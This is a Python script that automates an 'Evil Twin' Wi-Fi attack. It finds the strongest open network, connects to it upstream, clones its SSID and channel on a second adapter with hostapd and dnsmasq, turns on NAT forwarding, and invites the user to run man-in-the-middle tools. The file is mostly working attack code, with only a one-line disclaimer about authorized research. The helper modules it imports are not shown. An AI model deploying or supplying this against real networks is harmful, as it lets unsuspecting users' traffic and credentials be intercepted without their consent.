#!/usr/bin/env python3

"""
main.py
Author: YourName
Date: 2025-xx-xx

Automates:
1) Scanning for open Wi-Fi networks (STA_INTERFACE)
2) Connecting to strongest open network
3) Auto-detecting the AP's channel to mimic in Evil Twin
4) Configuring a second interface (AP_INTERFACE) as Evil Twin
5) Enabling NAT and packet forwarding
6) Starting hostapd + dnsmasq

DISCLAIMER: For authorized security research only.
"""

import sys
import time
import os

from modules.net_scan import scan_for_open_networks, pick_strongest_open_network
from modules.net_connect import connect_to_open_wifi
from modules.ap_config import (
    write_hostapd_config,
    write_dnsmasq_config,
    configure_ap_interface,
    start_hostapd_dnsmasq
)
from modules.nat_config import enable_nat

# -------------------------
# Configuration Constants
# -------------------------

# If your Pi Zero has only built-in Wi-Fi, you can attempt both STA + AP on the same interface, 
# but it's much easier to use two separate Wi-Fi adapters.
STA_INTERFACE = "wlan0"   # The interface that connects to upstream open Wi-Fi
AP_INTERFACE = "wlan1"    # The interface that creates the Evil Twin AP

# hostapd + dnsmasq config
HOSTAPD_CONFIG_TEMPLATE = "config_templates/hostapd.conf.template"
DNSMASQ_CONFIG_TEMPLATE = "config_templates/dnsmasq.conf.template"

HOSTAPD_CONFIG = "/etc/hostapd/hostapd.conf"
DNSMASQ_CONFIG = "/etc/dnsmasq.conf"

AP_IP = "192.168.50.1"
DHCP_RANGE_START = "192.168.50.2"
DHCP_RANGE_END = "192.168.50.200"
NETMASK = "255.255.255.0"

def main():
    # Must run as root
    if os.geteuid() != 0:
        print("[ERROR] This script must be run as root (sudo).")
        sys.exit(1)

    print("[*] Scanning for open networks...")
    networks = scan_for_open_networks(STA_INTERFACE)
    if not networks:
        print("[WARN] No open networks found. Exiting.")
        sys.exit(0)

    strongest = pick_strongest_open_network(networks)
    if not strongest:
        print("[WARN] Could not pick a strongest open network. Exiting.")
        sys.exit(0)

    ssid = strongest["ssid"]
    signal = strongest["signal"]
    channel = strongest["channel"]  # We'll clone the real AP's channel if possible

    print(f"[INFO] Found strongest open network: '{ssid}' (Signal: {signal}), Channel: {channel}")

    print("[*] Connecting to upstream open Wi-Fi...")
    success = connect_to_open_wifi(ssid, STA_INTERFACE)
    if not success:
        print("[ERROR] Could not connect to the open network. Exiting.")
        sys.exit(1)

    # Wait a moment for DHCP to get an IP from the upstream AP
    time.sleep(5)

    # Set up the Evil Twin
    print(f"[INFO] Setting up Evil Twin with SSID '{ssid}' on channel {channel} using interface {AP_INTERFACE}...")
    
    # 1) Configure AP interface
    configure_ap_interface(AP_INTERFACE, AP_IP)

    # 2) Write hostapd config
    write_hostapd_config(
        template_path=HOSTAPD_CONFIG_TEMPLATE,
        output_path=HOSTAPD_CONFIG,
        ap_interface=AP_INTERFACE,
        cloned_ssid=ssid,
        channel=channel
    )

    # 3) Write dnsmasq config
    write_dnsmasq_config(
        template_path=DNSMASQ_CONFIG_TEMPLATE,
        output_path=DNSMASQ_CONFIG,
        ap_interface=AP_INTERFACE,
        ap_ip=AP_IP,
        dhcp_range_start=DHCP_RANGE_START,
        dhcp_range_end=DHCP_RANGE_END,
        netmask=NETMASK
    )

    # 4) Start AP services
    start_hostapd_dnsmasq()

    # 5) Enable NAT
    enable_nat(sta_iface=STA_INTERFACE, ap_iface=AP_INTERFACE)

    print(f"[+] Evil Twin setup complete. Cloned SSID: '{ssid}' on interface '{AP_INTERFACE}'")
    print("    Connected upstream via", STA_INTERFACE)
    print("    Press Ctrl+C to stop or run your MITM tools as desired.")

if __name__ == "__main__":
    main()
